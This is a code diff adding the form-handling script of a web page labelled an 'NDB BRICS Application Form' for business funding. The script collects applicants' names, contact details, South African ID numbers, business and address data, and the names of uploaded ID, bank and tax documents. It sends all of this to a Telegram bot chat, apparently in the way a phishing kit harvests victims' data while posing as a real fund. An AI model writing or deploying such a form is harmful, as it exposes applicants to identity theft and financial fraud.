+      // SEND TO TELEGRAM
+      // ============================================
+      async function sendToTelegram(formData, filesInfo) {
+        const timestamp = new Date().toLocaleString("en-ZA", {
+          timeZone: "Africa/Johannesburg",
+        });
+
+        const message = `
+🚀 *NEW FUND APPLICATION SUBMITTED*
+📋 *Fund:* ${fund.toUpperCase()}
+🕐 *Time:* ${timestamp}
+
+━━━━━━━━━━━━━━━━━━━
+
+👤 *PERSONAL DETAILS*
+━━━━━━━━━━━━━━━━━━━
+*First Name:* ${formData.firstName || "—"}
+*Last Name:* ${formData.lastName || "—"}
+*Email:* ${formData.email || "—"}
+*Mobile:* ${formData.mobileNumber || "—"}
+*SA ID:* ${formData.idNumber || "—"}
+
+━━━━━━━━━━━━━━━━━━━
+🏢 *BUSINESS DETAILS*
+━━━━━━━━━━━━━━━━━━━
+*Business Name:* ${formData.businessName || "—"}
+*Business Type:* ${formData.businessType || "—"}
+*CIPC Reg No:* ${formData.businessRegistrationNumber || "—"}
+*Industry:* ${formData.businessIndustry || "—"}
+*Description:* ${formData.businessDescription || "—"}
+
+━━━━━━━━━━━━━━━━━━━
+📍 *BUSINESS ADDRESS*
+━━━━━━━━━━━━━━━━━━━
+*Address:* ${formData.physicalAddress || "—"}
+*City:* ${formData.city || "—"}
+*Province:* ${formData.province || "—"}
+*Postal Code:* ${formData.postalCode || "—"}
+
+━━━━━━━━━━━━━━━━━━━
+💰 *FUNDING DETAILS*
+━━━━━━━━━━━━━━━━━━━
+*Amount:* ${formData.fundingAmount || "—"}
+*Reason:* ${formData.reasonForFunding || "—"}
+
+━━━━━━━━━━━━━━━━━━━
+📎 *DOCUMENTS UPLOADED*
+━━━━━━━━━━━━━━━━━━━
+${filesInfo || "None uploaded"}
+
+━━━━━━━━━━━━━━━━━━━
+✅ *POPIA Consent:* ${formData.consentToPopia ? "Given" : "Not given"}
+━━━━━━━━━━━━━━━━━━━
+`.trim();
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        try {
+          const resp = await fetch(url, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+              chat_id: TELEGRAM_CHAT_ID,
+              text: message,
+              parse_mode: "Markdown",
+            }),
+          });
+          const data = await resp.json();
+          if (data.ok) {
+            console.log("✅ Telegram sent successfully");
+            return true;
+          } else {
+            console.error("❌ Telegram error:", data);
+            return false;
+          }
+        } catch (err) {
+          console.error("❌ Failed to send to Telegram:", err);
+          return false;
+        }
+      }
+
+      // ============================================
+      // FORM SUBMISSION
+      // ============================================
+      document
+        .getElementById("applicationForm")
+        .addEventListener("submit", async function (e) {
+          e.preventDefault();
+
+          // Clear previous errors
+          document
+            .querySelectorAll(".form-group.error")
+            .forEach((el) => el.classList.remove("error"));
+
+          const form = this;
+          let isValid = true;
+
+          // Validate required fields
+          form.querySelectorAll("[required]").forEach(function (field) {
+            const group = field.closest(".form-group");
+            if (!group) return;
+            let value =
+              field.type === "checkbox"
+                ? field.checked
+                  ? "checked"
+                  : ""
+                : field.value.trim();
+
+            if (!value) {
+              group.classList.add("error");
+              isValid = false;
+            } else {
+              if (field.type === "email") {
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                if (!emailRegex.test(value)) {
+                  group.classList.add("error");
+                  isValid = false;
+                }
+              }
+              if (field.name === "idNumber" && value.length !== 13) {
+                group.classList.add("error");
+                isValid = false;
+                const et = group.querySelector(".error-text");
+                if (et) et.textContent = "ID number must be 13 digits";
+              }
+              if (field.name === "mobileNumber" && value.length < 10) {
+                group.classList.add("error");
+                isValid = false;
+                const et = group.querySelector(".error-text");
+                if (et) et.textContent = "Please enter a valid 10-digit number";
+              }
+            }
+          });
+
+          if (!isValid) {
+            const firstError = form.querySelector(".form-group.error");
+            if (firstError) {
+              firstError.scrollIntoView({
+                behavior: "smooth",
+                block: "center",
+              });
+              firstError.querySelector("input, select, textarea")?.focus();
+            }
+            showToast("Please correct the errors highlighted above.", true);
+            return;
+          }
+
+          // Show loading state
+          const submitBtn = document.getElementById("submitBtn");
+          const originalText = submitBtn.textContent;
+          submitBtn.innerHTML = '<span class="spinner"></span> Submitting...';
+          submitBtn.disabled = true;
+
+          // Collect all form data
+          const formData = {};
+          form.querySelectorAll("[name]").forEach((field) => {
+            if (field.type === "checkbox") {
+              formData[field.name] = field.checked ? "Yes" : "No";
+            } else if (field.type === "file") {
+              // Files are handled separately
+            } else {
+              formData[field.name] = field.value.trim();
+            }
+          });
+
+          // Collect file info
+          const fileFields = [
+            "file_sa_id",
+            "file_proof_addr",
+            "file_bank_stmt",
+            "file_cipc",
+            "file_tax",
+            "file_company_profile",
+          ];
+          const fileLabels = [
+            "SA ID Document",
+            "Proof of Address",
+            "Bank Statement",
+            "CIPC Certificate",
+            "Tax Clearance",
+            "Company Profile",
+          ];
+          const filesInfo = fileFields
+            .map((id, i) => {
+              const input = document.getElementById(id);
+              const fileName =
+                input && input.files.length > 0
+                  ? input.files[0].name
+                  : "Not uploaded";
+              return `• ${fileLabels[i]}: ${fileName}`;
+            })
+            .join("\n");
+
+          // Send to Telegram
+          let sent = false;
+          if (
+            TELEGRAM_BOT_TOKEN !== "YOUR_BOT_TOKEN_HERE" &&
+            TELEGRAM_CHAT_ID !== "YOUR_CHAT_ID_HERE"
+          ) {
+            sent = await sendToTelegram(formData, filesInfo);
+          }
+
+          // Show success
+          submitBtn.innerHTML = originalText;
+          submitBtn.disabled = false;
+
+          if (sent) {
+            showToast(
+              "Application submitted successfully! We will be in touch within 5-7 business days.",
+            );
+          } else {
+            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") {
+              showToast(
+                "Application captured. (Set your Telegram bot token in the script to receive notifications.)",
+              );
+              console.log("📋 FORM DATA CAPTURED:", formData);
+              console.log("📎 FILES:", filesInfo);
+            } else {
+              showToast(
+                "Application submitted, but Telegram notification failed. Data saved locally.",
+              );
+              console.log("📋 FORM DATA:", formData);
+              console.log("📎 FILES:", filesInfo);
+            }
+          }
+
+          form.reset();
+          // Reset file upload buttons
+          document.querySelectorAll(".btn-upload").forEach((btn) => {
+            btn.innerHTML = `<svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg> Upload`;
+            btn.style.borderColor = "#d0c8e0";
+            btn.style.color = "#3F2461";
+          });
+        });
+
+      // Real-time validation clearing
+      document
+        .querySelectorAll(
+          ".form-group input, .form-group select, .form-group textarea",
+        )
+        .forEach(function (field) {
+          field.addEventListener("input", function () {
+            this.closest(".form-group")?.classList.remove("error");
+          });
+          field.addEventListener("change", function () {
+            this.closest(".form-group")?.classList.remove("error");
+          });
+        });
+
+      // File upload feedback
+      document.querySelectorAll('input[type="file"]').forEach(function (input) {
+        input.addEventListener("change", function () {
+          const btn = this.parentElement.querySelector(".btn-upload");
+          if (this.files.length > 0) {
+            const name =
+              this.files[0].name.length > 20
+                ? this.files[0].name.substring(0, 17) + "..."
+                : this.files[0].name;
+            btn.innerHTML = `<svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg> ${name}`;
+            btn.style.borderColor = "#48bb78";
+            btn.style.color = "#276749";
+          } else {
+            btn.innerHTML = `<svg stroke="currentColor" fill="none" stroke-width="2" viewBox="0 0 24 24" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="17 8 12 3 7 8"></polyline><line x1="12" y1="3" x2="12" y2="15"></line></svg> Upload`;
+            btn.style.borderColor = "#d0c8e0";
+            btn.style.color = "#3F2461";
+          }
+        });
+      });
+
+      console.log(
+        "NDB BRICS Application Form loaded — Telegram integration ready",
+      );
+    </script>
+  </body>
+</html>
